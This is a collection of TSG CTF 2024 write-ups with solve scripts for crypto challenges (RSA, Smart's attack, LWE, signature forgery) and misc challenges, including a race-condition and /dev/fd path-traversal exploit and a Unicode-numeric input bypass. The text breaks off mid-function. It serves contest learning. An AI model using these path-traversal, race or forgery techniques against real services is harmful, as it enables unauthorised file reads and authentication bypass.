---
title: "vuln-img - TSG CTF 2024"
category: "crypto"
subcategory: "number-theory"
type: "writeup"
tags: ["crypto", "xor", "chinese-remainder", "smart-attack", "proof-of-work", "eval", "number-theory", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "We can recover the key by brute forcing lower bits of p and q"
source:
  name: "CTFtime writeup #39797"
  url: "https://ctftime.org/writeup/39797"
original_source: "https://github.com/dicegang/tsg-ctf-2024/"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "vuln-img"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** vuln-img
- **Author team:** DiceGang
- **CTFtime:** <https://ctftime.org/writeup/39797>
- **Original writeup:** <https://github.com/dicegang/tsg-ctf-2024/>

---
# TSG CTF 2024 writeups

## crypto

### Mystery of Scattered Key
We can recover the key by brute forcing lower bits of p and q

```py
from Crypto.Util.number import long_to_bytes

N = 20258342755030699342765611614877226774887411463378181451840683524015047892651973850627359327237027774356720466793903228878105456871700095061940512708020098618057571729943083434709826167248620306311075548853347901271259447873417249634361203320669711383057513256692645763182907367630873827308387269636636289231405813338687900835089134983309705316926805886077666050520726687030034195743282451467528496315178642323807316904673350899061558504836111406826196935670026969650853021793806021689762347770412960223358347923518483267323592429810806182091459339480461991545802571444958728299104188325433443437138511489545219679697
e = 0x10001
c = 7123414739023542748810203483709689015408917851116023820618517477707107834968496358236168325897320226453721626392832959216652528045703210750125701176032827942299755718368878395927764432908785593372611140758024558283573960529417102003625606595077755879081211049268879243499173403440059239858308427266558935817943602623773418104985260309484175243613311427707700872120183486969325635776183186398996045018265812500716946531309303922788481972201938026485853049867490332841823037660486595790337519475108241096821738281828388702502632013367441754603384687444518555226345985885414563346111755133096794599057161802602344386709
p_splitted = [1648, 26443, 23758, 59540, 54722, 64595, 54876, 56461, 37559, 58038, 62190, 48794, 3685, 15347, 37807, 65456, 27238, 43839, 27847, 38403, 26704, 6902, 13361, 48888, 40733, 30039, 2759, 31739, 10053, 15206, 32185, 8727, 53066, 51903, 33778, 57075, 7384, 34279, 55988, 26971, 15381, 10770, 14264, 30253, 11971, 50652, 14420, 7242, 54046, 21582, 26535, 42340, 43335, 52478, 60716, 21061, 2633, 24288, 44532, 50813, 49308, 30582, 3906, 4989]
q_splitted = [17900, 40783, 35173, 58646, 30439, 8839, 14895, 33243, 40515, 60827, 39626, 23436, 11739, 48698, 26830, 44120, 9651, 38993, 3295, 4606, 57793, 57260, 63312, 38766, 33916, 15401, 37856, 21410, 23082, 4751, 12279, 60843, 26791, 61740, 8570, 31666, 55249, 23535, 64786, 26597, 3997, 60330, 28810, 21136, 20487, 55594, 10618, 34867, 55177, 33728, 60147, 62991, 36041, 50205, 44371, 40864, 36657, 32481, 5885, 12358, 6736, 8984, 5618, 27045]

# possible p start candidates for lowest 2 bytes
pp = [p for p in p_splitted if p%2 == 1]

# possible q start candidates for lowest 2 bytes
qq = [q for q in q_splitted if q%2 == 1]

for i in range(1, len(p_splitted)+1):
    print(f"i: {i}")
    print(f"pp: {len(pp)}")
    print(f"qq: {len(qq)}")
    new_pp = []
    new_qq = []
    for p in pp:
        for q in qq:
            if p * q == N:
                print(f"p = {p}")
                print(f"q = {q}")
                # we win, decrypt the flag
                d = pow(e, -1, (p-1)*(q-1))
                m = pow(c, d, N)
                print(m.to_bytes((m.bit_length()-1)//8 + 1, 'big'))


                exit()
            N_start = N.to_bytes(256, 'big')[-i*2:]
            N_test = (p*q).to_bytes(256, 'big')[-i*2:]
            if N_start == N_test:
                print(f"Found p candidate: {p} and q candidate: {q}")
                new_pp += [(x << (16*i)) + p for x in p_splitted]
                new_qq += [(x << (16*i)) + q for x in q_splitted]
    pp = new_pp
    qq = new_qq
```

### Feistel Barrier
Invert the function.

```python
from hashlib import sha256

k = 1024//8
h_len = 32

def mgf(seed,mask_len):
    if mask_len > 2**32:
        raise ValueError("mask too long")
    t = b''
    for i in range(mask_len//h_len+1):
        t += sha256(seed + i.to_bytes(4, 'little')).digest()
    return t[:mask_len]

def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

EM = b'\x00GM\x99\xa0\xd92x\xa3\xd7\x84s\xa3N\xd6q\xff\xfeP\xder\xb8\xc6\xb3d\xf2\n\xf6\xdd\x82\x1a\xdd"l\xe0\'\xe7\xec:\x95F\x82\xe2Y_H`m\xea\x03"g\x826\xe8\xca\xe8)\x822\xe9_\x1b\x07\x90\x91\x8c4G\xe0%\xd9M\xeb6\xa8\xa6,%\xf1\xd4\xdf\xaeb\x13\x10\xc1\xaf"\xb5\xd9\x96\x92\x1c\xf5\xe1m\xe5=+\x1e\xb1\xf1\xcbt\xc6f\xdc\x81I&\xf2yk\x96\x06\x90\x02\x91\x1dL\xdf*9>\xfe\x0fW'

maskedSeed, maskedDB = EM[1:1+h_len], EM[1+h_len:]

seedMask = mgf(maskedDB, h_len)
seed = xor(maskedSeed, seedMask)
dbMask = mgf(seed, k - h_len -1)
DB = xor(maskedDB, dbMask)

print(DB)
```

### Easy?? ECDLP
Do Smart's attack.

```python
def SmartAttack(P,Q,p):
    E = P.curve()
    Eqq = E.change_ring(QQ)
    Eqp = Eqq.change_ring(Qp(p, 5))

    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)
    for P_Qp in P_Qps:
        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:
            break

    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)
    for Q_Qp in Q_Qps:
        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:
            break

    p_times_P = p*P_Qp
    p_times_Q = p*Q_Qp

    x_P,y_P = p_times_P.xy()
    x_Q,y_Q = p_times_Q.xy()

    phi_P = -(x_P/y_P)
    phi_Q = -(x_Q/y_Q)
    k = phi_Q/phi_P
    return ZZ(k)

a, b = [0x1c456bfc3fabba99a737d7fd127eaa9661f7f02e9eb2d461d7398474a93a9b87,0x8b429f4b9d14ed4307ee460e9f8764a1f276c7e5ce3581d8acd4604c2f0ee7ca]
X,Y,Z = (92512155407887452984968972936950900353410451673762367867085553821839087925110135228608997461366439417183638759117086992178461481890351767070817400228450804002809798219652013051455151430702918340448295871270728679921874136061004110590203462981486702691470087300050508138714919065755980123700315785502323688135 ,40665795291239108277438242660729881407764141249763854498178188650200250986699 , 1)

p = 0xd9d35163a870dc6dfb7f43911ff81c964dc8e1dd2481fdf6f0e653354b59c5e5
ec = EllipticCurve(Zmod(p**4),[a,b])
P = ec.point((X,Y,Z))
Qxyz = (62273117814745802387117000953578316639782644586418639656941009579492165136792362926314161168383693280669749433205290570927417529976956408493670334719077164685977962663185902752153873035889882369556401683904738521640964604463617065151463577392262554355796294028620255379567953234291193792351243682705387292519, 518657271161893478053627976020790808461429425062738029168194264539097572374157292255844047793806213041891824369181319495179810050875252985460348040004008666418463984493701257711442508837320224308307678689718667843629104002610613765672396802249706628141469710796919824573605503050908305685208558759526126341)
Q = ec.point(Qxyz)

# E = EllipticCurve(GF(p), [a, b])
# P = E.point((X, Y, Z))
# Q = 1337 * P

print(SmartAttack(P, Q, p))
```

### Who is the Outlier?
Guess what the disagree index is and then solve the linear equation.

```python
with open('output.txt') as f:
	n = eval(f.readline().split('=')[-1])
	m = eval(f.readline().split('=')[-1])
	p = eval(f.readline().split('=')[-1])
	q = eval(f.readline().split('=')[-1])
	ciphertexts = eval(f.readline().split('=')[-1])

# save(ciphertexts, 'ciphertexts')
# ciphertexts = load('ciphertexts')

# samples = [i for i in range(1100)]
samples = [i for i in range(m - 1100, m)]
# samples = [i for i in range(550)] + [i for i in range(m - 550, m)]
print(len(samples))
M = matrix(Integers(p), [ciphertexts[i][:-1] for i in samples])
v = vector(Integers(p), [ciphertexts[i][-1] - p//q for i in samples])

print(M.solve_right(v))
```

```python
def dot(a,b,p):
    assert len(a) == len(b)
    return sum([(a[i]*b[i])%p for i in range(len(a))])%p

with open('output.txt') as f:
	n = eval(f.readline().split('=')[-1])
	m = eval(f.readline().split('=')[-1])
	p = eval(f.readline().split('=')[-1])
	q = eval(f.readline().split('=')[-1])
	ciphertexts = eval(f.readline().split('=')[-1])
	encrypted_flag = eval(f.readline().split('=')[-1])

secret_key = (0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0)

flag = []
for ct in encrypted_flag:
	a, b = ct[:-1], ct[-1]
	pt = b - dot(secret_key, a, p)
	flag.append(pt // (p//q))
print(bytes(flag))
```

### CONPASS
The server doesn't apply the modular reduction on the message, so you can just choose a large message (conforming to the JSON format requirement) which reduces to the some value that you already have a signature for.

```python
'''

data = {"data":}

'''

import json
import math
import os
import requests
import string
import time

from sympy.ntheory.modular import crt

valid_chars = set(string.printable[:-5])

positions = {
    "user": [3861, -67500, 50947],
    "sat0": [67749, 27294, 94409],
    "sat1": [38630, -52128, -9112],
    "sat2": [-86459, -74172, 8698],
    "sat3": [36173, -84060, 95354],
    "flag": [0,0,0]
}

def distance(a,b):
    dist = 0
    for i in range(3):
        dist += (a[i]-b[i])**2
    return math.sqrt(dist)

def is_in_area(data):
    try:
        ut = time.time()
        data_sat0 = json.loads(my_decoder(data.sat0["data"]))
        data_sat1 = json.loads(my_decoder(data.sat1["data"]))
        data_sat2 = json.loads(my_decoder(data.sat2["data"]))
        data_sat3 = json.loads(my_decoder(data.sat3["data"]))
        if (-1 <= (ut - data_sat0["time"]) - distance(positions["sat0"],positions["flag"]) <= 20) and (-1 <= (ut - data_sat1["time"]) - distance(positions["sat1"],positions["flag"]) <= 20) and (-1 <= (ut - data_sat2["time"]) - distance(positions["sat2"],positions["flag"]) <= 20) and (-1 <= (ut - data_sat3["time"]) - distance(positions["sat3"],positions["flag"]) <= 20):
            return True
        else:
            return False
    except:
        return False

def verify(data: str,signature: str,public_key):
    data_int = int.from_bytes(bytes.fromhex(data),'little')
    sign_int = int.from_bytes(bytes.fromhex(signature),'little')
    print(data_int%public_key["n"])
    print(pow(sign_int,public_key["e"],public_key["n"]))
    return data_int%public_key["n"] == pow(sign_int,public_key["e"],public_key["n"])

def my_decoder(hex_data):
    str_data = bytes.fromhex(hex_data).decode('utf-8',errors = 'ignore')
    #trim illegal characters
    str_data = ''.join(filter(lambda x: x in valid_chars, str_data))
    return str_data

def to_hex(m):
	m_hex = hex(m)[2:]
	if len(m_hex) % 2 == 1:
		m_hex = '0' + m_hex
	return m_hex

def encode_time(t, n, old_m):
	while True:
		try:
			data = f'{{"time":{t},"a":"'.encode() + os.urandom(100).hex().encode() + b'"}'
			m = int.from_bytes(data, 'little')
			m += crt([n, 2**(31*8)], [(old_m - m) % n, 0])[0]
			assert m % n == old_m
			auth = m.to_bytes(500, 'little').hex().rstrip('0')
			data = json.loads(my_decoder(auth))
			break
		except Exception as e:
			print(e)
	return auth

ut = time.time()
time0 = -10 + ut - distance(positions["sat0"],positions["flag"])
time1 = -10 + ut - distance(positions["sat1"],positions["flag"])
time2 = -10 + ut - distance(positions["sat2"],positions["flag"])
time3 = -10 + ut - distance(positions["sat3"],positions["flag"])

print(time0, time1, time2, time3)
assert (-1 <= (ut - time0) - distance(positions["sat0"],positions["flag"]) <= 20) and (-1 <= (ut - time1) - distance(positions["sat1"],positions["flag"]) <= 20) and (-1 <= (ut - time2) - distance(positions["sat2"],positions["flag"]) <= 20) and (-1 <= (ut - time3) - distance(positions["sat3"],positions["flag"]) <= 20)

n = 151673558493880563518515908865915242404931224395608930626387143469265062161002139193707034848921552373226627191961116691420441511082888835894046886366105577598005689430349675599876425041686090254905158383058868093041232279628627279229036803274110378261209039473863769298379974188322926579836278844211971488597
encode_time(time0, n, 1337)

sat0 = requests.get('http://34.146.145.253:42001/sat0').json()
sat1 = requests.get('http://34.146.145.253:42001/sat1').json()
sat2 = requests.get('http://34.146.145.253:42001/sat2').json()
sat3 = requests.get('http://34.146.145.253:42001/sat3').json()

auth0 = encode_time(time0, sat0['public_key']['n'], int.from_bytes(bytes.fromhex(sat0['data']), 'little'))
auth1 = encode_time(time1, sat1['public_key']['n'], int.from_bytes(bytes.fromhex(sat1['data']), 'little'))
auth2 = encode_time(time2, sat2['public_key']['n'], int.from_bytes(bytes.fromhex(sat2['data']), 'little'))
auth3 = encode_time(time3, sat3['public_key']['n'], int.from_bytes(bytes.fromhex(sat3['data']), 'little'))

print('---')
print(auth0)
print(auth1)
print(auth2)
print(auth3)

print(requests.post('http://34.146.145.253:42001/auth', json={
		'sat0': {'data': auth0, 'sign': sat0['sign']},
		'sat1': {'data': auth1, 'sign': sat1['sign']},
		'sat2': {'data': auth2, 'sign': sat2['sign']},
		'sat3': {'data': auth3, 'sign': sat3['sign']},
	}).content)
```

## misc

### Cached File Viewer
In the first version of Cached File Viewer, you could simply load any 'flag' file twice, and the 2nd would skip the 'mark as flag' step.

```console
❯ nc 34.146.186.1 21001
1. load_file
2. read
3. bye
choice > 1
index > 1
filename > flag
Read 22 bytes.
1. load_file
2. read
3. bye
choice > 1
index > 2
filename > flag
1. load_file
2. read
3. bye
choice > 2
index > 2
content: TSGCTF{!7esuVVz2n@!Fm}
1. load_file
2. read
3. bye
choice > 3
```

### Cached File Viewer 2
With the original bug patched, Cached File Viewer 2 relies on a race condition using at least two separate connections to the server and a path traversal vulnerability to read from shared file descriptor numbers. The first connection determines it's own pid by reading `/dev/fd/../../self/stat`, then prepares to read the flag file repeatedly. The second connection repeatedly reads `/dev/fd/../../{pid}/fd/3`, where `{pid}` references the process handling the first connection. This allows the 2nd connection to read any file the first has open, without recording any restrictions based on the path to said file. Finally the 1st connection repeatedly reads the `flag` file, until the 2nd connection hits the race condition and allows the file to be dumped.

```python!
serv = "34.146.186.1"
port = 21005

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process(cmd)
    return r

def main():
    r1 = conn()
    r1.send(b"1\n0\n/dev/fd/../../self/stat\n2\n0\n")
    r1.recvuntil(b"content: ")
    pid = int(r1.recvuntil(b" "))
    log.info(f"{pid=}")
    hammer = b""
    for i in range(1, 10):
        hammer += (f"1\n{i}\n."+"/"*i+"flag\n").encode()

    r2 = conn()
    r2.send(f"1\n1\n/dev/fd/../../{pid}/fd/3\n2\n1\n"*1000)
    
    r1.send(hammer)
    r2.interactive()
```

### simple calc
The `calc` function lets us add / multiply numbers, and the result of the calculation is used as the index into `text`. The flag is `12_345_678` characters inside of text:

`text = '*' * 12_345_678 + "FAKECTF{THIS_IS_FAKE}" + '*' * 12345678`

So, we need `calc` to output a large number. However, we don't have a large input to `calc`:
```python
def check(s):
    if not all(c.isnumeric() or c in '+*' for c in s):
        return False
    if len(s) >= 6: # I don't like long expressions!
        return False
    return True
```

We only have 5 characters to make a number as large as `12_345_678`. Looking at the `check` function, we see that it validates whether a number is numeric by doing `c.isnumeric()`. Looking at the [docs](https://docs.python.org/3/library/stdtypes.html#str.isnumeric):
> Numeric characters include digit characters, and all characters that have the Unicode numeric value property

So, unicode numeric values pass the check. Then, when `calc` calls `numeric`, it will return the unicode numeric value of the character. This gives us a way to make very large numbers! For example, the unicode character `京` is equal to `10000000000000000`. So, we need to find a short enough combination of these characters that is equal to the flag character that we want.

I'm too dumb to think about a smart way to do this so I just asked Claude to write a bruteforcer script in Rust.

```rust
use rayon::prelude::*;

const VALUES: [f64; 143] = [
    10000000000000000.0, 1000000000000.0, 10000000000.0, 100000000.0, 20000000.0,
    10000000.0, 1000000.0, 900000.0, 800000.0, 700000.0, 600000.0, 500000.0, 432000.0,
    400000.0, 300000.0, 216000.0, 200000.0, 100000.0, 90000.0, 80000.0, 70000.0, 60000.0,
    50000.0, 40000.0, 30000.0, 20000.0, 10000.0, 9000.0, 8000.0, 7000.0, 6000.0, 5000.0,
    4000.0, 3000.0, 2000.0, 1000.0, 900.0, 800.0, 700.0, 600.0, 500.0, 400.0, 300.0, 200.0,
    100.0, 90.0, 80.0, 70.0, 60.0, 50.0, 49.0, 48.0, 47.0, 46.0, 45.0, 44.0, 43.0, 42.0,
    41.0, 40.0, 39.0, 38.0, 37.0, 36.0, 35.0, 34.0, 33.0, 32.0, 31.0, 30.0, 29.0, 28.0,
    27.0, 26.0, 25.0, 24.0, 23.0, 22.0, 21.0, 20.0, 19.0, 18.0, 8.5, 17.0, 16.0, 7.5, 15.0,
    14.0, 6.5, 13.0, 12.0, 0.9166666666666666, 5.5, 11.0, 0.8333333333333334, 10.0, 0.75,
    4.5, 9.0, 0.6666666666666666, 8.0, 0.5833333333333334, 0.875, 3.5, 7.0, 0.5, 6.0,
    0.4166666666666667, 0.625, 2.5, 5.0, 0.3333333333333333, 0.8, 4.0, 0.0375, 0.046875,
    0.15, 0.1875, 0.25, 0.375, 0.6, 1.5, 3.0, 0.16666666666666666, 0.4, 2.0, 0.003125,
    0.00625, 0.0125, 0.015625, 0.025, 0.03125, 0.05, 0.0625, 0.08333333333333333, 0.1,
    0.1111111111111111, 0.125, 0.14285714285714285, 0.2, 1.0, 0.0, -0.5
];

fn calc(expr: &[u8]) -> Option<f64> {
    if let Some(pos) = expr.iter().position(|&c| c == b'+') {
        return Some(calc(&expr[..pos])? + calc(&expr[pos+1..])?);
    }
    if let Some(pos) = expr.iter().position(|&c| c == b'*') {
        return Some(calc(&expr[..pos])? * calc(&expr[pos+1..])?);
    }
    let mut result = 0.0;
    for &c in expr {
        result = 10.0 * result + VALUES[c as usize];
    }
    Some(result)
}

fn check(expr: &[u8]) -> bool {
    if expr.len() >= 6 {
        return false;
    }
    expr.iter().all(|&c| VALUES.get(c as usize).is_some() || c == b'+' || c == b'*')
}

fn try_expression(target: f64, len: usize) -> Option<Vec<u8>> {
    // For the first position, try all values in parallel
    (0..VALUES.len() + 2).into_par_iter().find_map_any(|first| {
        let mut expr = vec![0; len];
        let first_char = if first < VALUES.len() {
            first as u8
        } else if first == VALUES.len() {
            b'+'
        } else {
            b'*'
        };
        expr[0] = first_char;
        
        try_expr_recursive(&mut expr, 1, target)
    })
}

fn try_expr_recursive(expr: &mut Vec<u8>, pos: usize, target: f64) -> Option<Vec<u8>> {
    if pos == expr.len() {
        if check(expr) {
            if let Some(val) = calc(expr) {
                if (val - target).abs() < 1e-10 {
                    return Some(expr.clone());
                }
            }
        }
        return None;
    }

    // Try both values and operators at each position
    for i in 0..VALUES.len() {
        expr[pos] = i as u8;
        if let Some(result) = try_expr_recursive(expr, pos + 1, target) {
            return Some(result);
        }
    }
    
    for &op in &[b'+', b'*'] {
        expr[pos] = op;
        if let Some(result) = try_expr_recursive(expr, pos + 1, target) {
            return Some(result);
        }
    }

    None
}

fn solve(target: f64) -> Option<Vec<u8>> {
    // Try expressions of increasing length
    for len in 1..6 {
        if let Some(solution) = try_expression(target, len) {
            return Some(solution);
        }
    }
    None
}
fn main() {
    rayon::ThreadPoolBuilder::new().num_threads(18).build_global().unwrap();
    let target = std::env::args().nth(1).unwrap().parse().unwrap();
    if let Some(solution) = solve(target) {
        println!("{:?}", solution);
    } else {
        println!("No solution found for target {}", target);
    }
}
```

The script has a list of `VALUES`, each of which match to one unicode numeric value. Then it bruteforces combinations to get to the target. It returns the indices in the array, which I then convert back to unicode characters in my final Python solve script (also mostly generated by Claude):

```python
from pwn import *
import subprocess
import json

VALUES = [
    10000000000000000.0, 1000000000000.0, 10000000000.0, 100000000.0, 20000000.0,
    10000000.0, 1000000.0, 900000.0, 800000.0, 700000.0, 600000.0, 500000.0, 432000.0,
    400000.0, 300000.0, 216000.0, 200000.0, 100000.0, 90000.0, 80000.0, 70000.0, 60000.0,
    50000.0, 40000.0, 30000.0, 20000.0, 10000.0, 9000.0, 8000.0, 7000.0, 6000.0, 5000.0,
    4000.0, 3000.0, 2000.0, 1000.0, 900.0, 800.0, 700.0, 600.0, 500.0, 400.0, 300.0, 200.0,
    100.0, 90.0, 80.0, 70.0, 60.0, 50.0, 49.0, 48.0, 47.0, 46.0, 45.0, 44.0, 43.0, 42.0,
    41.0, 40.0, 39.0, 38.0, 37.0, 36.0, 35.0, 34.0, 33.0, 32.0, 31.0, 30.0, 29.0, 28.0,
    27.0, 26.0, 25.0, 24.0, 23.0, 22.0, 21.0, 20.0, 19.0, 18.0, 8.5, 17.0, 16.0, 7.5, 15.0,
    14.0, 6.5, 13.0, 12.0, 0.9166666666666666, 5.5, 11.0, 0.8333333333333334, 10.0, 0.75,
    4.5, 9.0, 0.6666666666666666, 8.0, 0.5833333333333334, 0.875, 3.5, 7.0, 0.5, 6.0,
    0.4166666666666667, 0.625, 2.5, 5.0, 0.3333333333333333, 0.8, 4.0, 0.0375, 0.046875,
    0.15, 0.1875, 0.25, 0.375, 0.6, 1.5, 3.0, 0.16666666666666666, 0.4, 2.0, 0.003125,
    0.00625, 0.0125, 0.015625, 0.025, 0.03125, 0.05, 0.0625, 0.08333333333333333, 0.1,
    0.1111111111111111, 0.125, 0.14285714285714285, 0.2, 1.0, 0.0, -0.5
]

REVERSE_MAP = {"0":"U+0030","1":"U+0031","2":"U+0032","3":"U+0033","4":"U+0034","5":"U+0035","6":"U+0036","7":"U+0037","8":"U+0038","9":"U+0039","10":"U+0BF0","11":"U+216A","12":"U+216B","13":"U+246C","14":"U+246D","15":"U+246E","16":"U+09F9","17":"U+16EE","18":"U+16EF","19":"U+16F0","20":"U+1373","21":"U+3251","22":"U+3252","23":"U+3253","24":"U+3254","25":"U+3255","26":"U+3256","27":"U+3257","28":"U+3258","29":"U+3259","30":"U+1374","31":"U+325B","32":"U+325C","33":"U+325D","34":"U+325E","35":"U+325F","36":"U+32B1","37":"U+32B2","38":"U+32B3","39":"U+32B4","40":"U+1375","41":"U+32B6","42":"U+32B7","43":"U+32B8","44":"U+32B9","45":"U+32BA","46":"U+32BB","47":"U+32BC","48":"U+32BD","49":"U+32BE","50":"U+1376","60":"U+1377","70":"U+1378","80":"U+1379","90":"U+137A","100":"U+0BF1","200":"U+7695","300":"U+1011B","400":"U+1011C","500":"U+216E","600":"U+1011E","700":"U+1011F","800":"U+10120","900":"U+10121","1000":"U+0BF2","2000":"U+10123","3000":"U+10124","4000":"U+10125","5000":"U+2181","6000":"U+10127","7000":"U+10128","8000":"U+10129","9000":"U+1012A","10000":"U+137C","20000":"U+1012C","30000":"U+1012D","40000":"U+1012E","50000":"U+2187","60000":"U+10130","70000":"U+10131","80000":"U+10132","90000":"U+10133","100000":"U+2188","200000":"U+109EE","216000":"U+12432","300000":"U+109EF","400000":"U+109F0","432000":"U+12433","500000":"U+109F1","600000":"U+109F2","700000":"U+109F3","800000":"U+109F4","900000":"U+109F5","1000000":"U+16B5E","10000000":"U+1ECA1","20000000":"U+1ECA2","100000000":"U+4EBF","0.25":"U+00BC","0.5":"U+00BD","0.75":"U+00BE","0.0625":"U+09F4","0.125":"U+09F5","0.1875":"U+09F6","0.00625":"U+0D58","0.025":"U+0D59","0.0375":"U+0D5A","0.05":"U+0D5B","0.1":"U+0D5C","0.15":"U+0D5D","0.2":"U+0D5E","1.5":"U+0F2B","2.5":"U+0F2C","3.5":"U+0F2D","4.5":"U+0F2E","5.5":"U+0F2F","6.5":"U+0F30","7.5":"U+0F31","8.5":"U+0F32","-0.5":"U+0F33","0.14285714285714285":"U+2150","0.1111111111111111":"U+2151","0.3333333333333333":"U+2153","0.6666666666666666":"U+2154","0.4":"U+2156","0.6":"U+2157","0.8":"U+2158","0.16666666666666666":"U+2159","0.8333333333333334":"U+215A","0.375":"U+215C","0.625":"U+215D","0.875":"U+215E","10000000000000000":"U+4EAC","0.9166666666666666":"U+109BC","0.08333333333333333":"U+109F6","0.4166666666666667":"U+109FA","0.5833333333333334":"U+109FC","0.003125":"U+11FC0","0.0125":"U+11FC2","0.015625":"U+11FC3","0.03125":"U+11FC5","0.046875":"U+11FC7","10000000000":"U+16B60","1000000000000":"U+16B61"}

def brute(n):
